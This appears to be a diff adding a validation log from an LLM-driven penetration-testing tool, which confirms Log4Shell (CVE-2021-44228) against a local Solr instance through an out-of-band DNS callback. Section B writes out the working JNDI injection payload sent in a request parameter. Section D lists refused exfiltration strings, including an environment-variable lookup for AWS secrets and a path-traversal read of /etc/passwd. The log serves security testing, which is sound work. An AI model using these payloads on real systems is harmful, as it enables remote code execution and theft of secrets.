@@ -1,0 +1,124 @@
+23:46:17 clinkz.oob.collaborator      INFO  OOB collaborator started: zone=host.docker.internal:18080 shape=path http=0.0.0.0:18080 dns=0.0.0.0:15353
+23:46:17 clinkz.oob.collaborator      INFO  OOB collaborator health-check: http=True dns=True recorded=['dns', 'http'] → healthy=True
+23:46:17 clinkz.discovery.source_ingest INFO  source ingest: 3 files → 2 entrypoints, 5 call-sites, 0 guards (48 consts, 0 wrappers, 0 path-param keys, 0 routes) manifest=log4j-core 2.14.1 (< 2.15.0) declared in pom.xml → JNDI message-lookup egress un-gated (CVE-2021-44228)
+23:46:17 clinkz.discovery.engine      INFO  discovery: 1 active primitives, 5 Δ, 8 reachability edges, 8 hypotheses
+23:46:17 clinkz.llm.factory           INFO  Initializing LLM client: provider=anthropic agent_role=-
+23:46:18 clinkz.state                 INFO  State store connected (WAL mode): C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\log4shell_validation.db
+23:46:18 clinkz.state                 INFO  Created engagement: Log4Shell P6 — Solr CVE-2021-44228 (0be7cb63-9f16-4e49-8a79-bf44f3a99017)
+23:46:18 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+23:46:19 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+23:46:19 clinkz.agents.base.ExploitAgent INFO  Discovery handoff: 1 hypothesis task(s) received
+23:46:19 clinkz.agents.base.ExploitAgent INFO  Step 1: LLM planning exploits
+23:46:20 clinkz.agents.base.ExploitAgent WARNING LLM plan unparseable/empty; re-prompting LLM once for valid JSON
+23:46:22 clinkz.agents.base.ExploitAgent INFO  Coverage union: 1 LLM-planned + 0 deterministic coverage tasks (cap 150)
+23:46:22 clinkz.agents.base.ExploitAgent INFO  Discovery union: 1 hypothesis task(s) added to plan (2 total, cap 150)
+23:46:22 clinkz.agents.base.ExploitAgent INFO  Step 2: Executing 2 planned tasks (T1=2, T2=0, T3=0)
+23:46:24 clinkz.agents.base.ExploitAgent WARNING Unknown test method: GET
+23:46:24 clinkz.agents.base.ExploitAgent INFO  Step 3: LLM analyzing 1 findings
+23:46:39 clinkz.agents.base.ExploitAgent INFO  Step 4: No retry targets — skipping
+23:46:39 clinkz.agents.base.ExploitAgent INFO  Step 3b: no false-positive suspects to mark
+23:46:39 clinkz.agents.base.ExploitAgent INFO  Step 5: 0 technique results recorded to KB (incremental)
+23:46:39 clinkz.agents.base.ExploitAgent INFO  Step 6: Building result
+23:46:39 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+23:46:54 clinkz.llm.fallback.ResilientLLMClient INFO  ResilientLLMClient initialised — role=exploit profile=reasoning chain=['anthropic']
+23:46:54 clinkz.discovery.source_ingest INFO  source ingest: 4 files → 1 entrypoints, 1 call-sites, 0 guards (1 consts, 0 wrappers, 1 path-param keys, 1 routes) manifest=(none)
+23:46:54 clinkz.discovery.engine      INFO  discovery: 1 active primitives, 1 Δ, 1 reachability edges, 1 hypotheses
+23:46:54 clinkz.agents.base.ReportAgent INFO  ReportAgent starting (simple mode) for 'Log4Shell P6' (0be7cb63-9f16-4e49-8a79-bf44f3a99017)
+23:46:54 clinkz.agents.base.ReportAgent INFO  Loaded 9 findings, 0 targets
+23:46:54 clinkz.agents.base.ReportAgent INFO  JSON report written to outputs\0be7cb63-9f16-4e49-8a79-bf44f3a99017\report_0be7cb63-9f16-4e49-8a79-bf44f3a99017.json
+23:46:54 clinkz.agents.base.ReportAgent INFO  Markdown report written to outputs\0be7cb63-9f16-4e49-8a79-bf44f3a99017\report_0be7cb63-9f16-4e49-8a79-bf44f3a99017.md
+23:46:54 clinkz.agents.base.ReportAgent INFO  Report complete: 9 findings, risk_rating=Critical
+23:46:54 clinkz.oob.collaborator      INFO  OOB collaborator stopped and event log cleared
+
+==============================================================================
+PRE-FLIGHT (keys + Solr + collaborator health-check)
+==============================================================================
+Solr http://localhost:8983/solr/admin/cores -> HTTP 200; TOOL_EXEC_MODE=local
+ANTHROPIC_API_KEY present: True
+OOB collaborator healthy: zone=host.docker.internal:18080 shape=path dns_authority=host.docker.internal:15353 (jndi:dns:// target)
+
+==============================================================================
+A. LOG-SINK REACHABILITY — engine surfaces the channel at heuristic grade
+==============================================================================
+ingested files=3 tech=['Java', 'log4j-jndi-lookup-exposed']
+manifest verdict: log4j-core 2.14.1 (< 2.15.0) declared in pom.xml → JNDI message-lookup egress un-gated (CVE-2021-44228)
+  log sink: log_interpolation() tainted_by='*request*' @CoreAdminOperation.java:76
+  log sink: log_interpolation() tainted_by='core' @CoreAdminOperation.java:163
+  log sink: log_interpolation() tainted_by='core' @CoreAdminOperation.java:179
+  log sink: log_interpolation() tainted_by='requestid' @CoreAdminOperation.java:205
+  log sink: log_interpolation() tainted_by='electionNode' @CoreAdminOperation.java:229
+heuristic log-sink hypotheses: 8
+  - param='action' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+  - param='core' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+  - param='name' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+  - param='instanceDir' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+  - param='property.instanceDir' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+  - param='other' grade=static_heuristic test=_test_log4shell confirm=['P6'] rank=0.3375
+channels surfaced: ['action', 'core', 'name', 'instanceDir', 'property.instanceDir', 'other', 'requestid', 'op']
+
+==============================================================================
+B. P6 CONFIRM — _test_log4shell fires jndi:dns:// nonce, reaps the callback
+==============================================================================
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — action
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — core
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — name
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — instanceDir
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — property.instanceDir
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — other
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — requestid
+  [CRITICAL] Log4Shell RCE (CVE-2021-44228) via log-sink JNDI egress — op
+      • Request: Log4Shell JNDI probe http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq}
+      • Response: out-of-band JNDI/dns callback bearing the probe nonce received (dns from 127.0.0.1)
+      • class=log_interpolation (log4j-core message-lookup JNDI egress); confirmation=P6 out-of-band callback (no in-band signal by design)
+      • confirmation=P6 target=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq} status=None
+      • outbound_probe: GET http://localhost:8983/solr/admin/cores — action=${jndi:dns://host.docker.internal:15353/iunyeq6c7ybwumbg36cf2kt2vq}
+      • callback_nonce='iunyeq6c7ybwumbg36cf2kt2vq' (carried only in the one outbound probe; control_bore_it=False)
+      • confirming_excerpt: inbound callback: proto=dns src=127.0.0.1 host=iunyeq6c7ybwumbg36cf2kt2vq path= received_at=1784484978.881
+      • control [fresh single-use nonce minted but never sent to the target — the collaborator recorded no callback for it (proves the confirming callback is genuine inbound traffic, not a fabricated event)] 
+  Log4Shell findings: 8 (confirmed=True, raw-auditable pair=True)
+
+==============================================================================
+C. REAL SEAM — discovery task rides run() → _merge_discovery_tasks (live LLM)
+==============================================================================
+  seam exploit summary: Exploit phase complete. 2 tests run, 1 findings. By severity: {'critical': 1}. 0 results recorded to KB.
+  Log4Shell in state after seam: True
+
+==============================================================================
+D. EXFIL GUARDRAIL — the JNDI carrier refuses any non-nonce payload
+==============================================================================
+  refused exfil attempt '${env:AWS_SECRET_ACCESS_KEY}' (ValueError) ✓
+  refused exfil attempt '../../etc/passwd' (ValueError) ✓
+  refused exfil attempt 'victim.internal' (ValueError) ✓
+  refused exfil attempt 'a b' (ValueError) ✓
+
+==============================================================================
+E. ZERO-FP — a JNDI probe to an unreachable authority yields no finding
+==============================================================================
+  egress-denied control → 0 findings (expect 0)
+  built-in never-sent control on every confirmed finding: control_bore_it=False (in the raw pair above — unforgeability)
+
+==============================================================================
+F. NO REGRESSION — blind SSRF still confirms OOB; file-read still surfaces
+==============================================================================
+  SSRF blind confirmed OOB (generalized _oob_send): True (out-of-band callback bearing the probe nonce received (http from 127.0.0.1))
+  file-read (Flink) hypothesis still surfaces via _test_lfi: True
+
+==============================================================================
+REPORT + TRACE (raw artifact paths)
+==============================================================================
+engagement_id : 0be7cb63-9f16-4e49-8a79-bf44f3a99017
+report (json) : outputs\0be7cb63-9f16-4e49-8a79-bf44f3a99017\report_0be7cb63-9f16-4e49-8a79-bf44f3a99017.json
+report (md)   : outputs\0be7cb63-9f16-4e49-8a79-bf44f3a99017\report_0be7cb63-9f16-4e49-8a79-bf44f3a99017.md
+trace (jsonl) : C:\Users\ptkva\OneDrive\Documents\clinkz\outputs\0be7cb63-9f16-4e49-8a79-bf44f3a99017\trace.jsonl
+
+==============================================================================
+VERDICT
+==============================================================================
+  A. log-sink channel surfaced at heuristic grade : True
+  B. Log4Shell CONFIRMED via P6 (raw-auditable)    : True
+  C. confirmed through the real run() seam         : True
+  D. exfil guardrail holds (structural)            : True
+  E. zero-FP (egress denied → no finding)          : True
+  F. SSRF-OOB + file-read unregressed              : True
+
+  RESULT: PASS
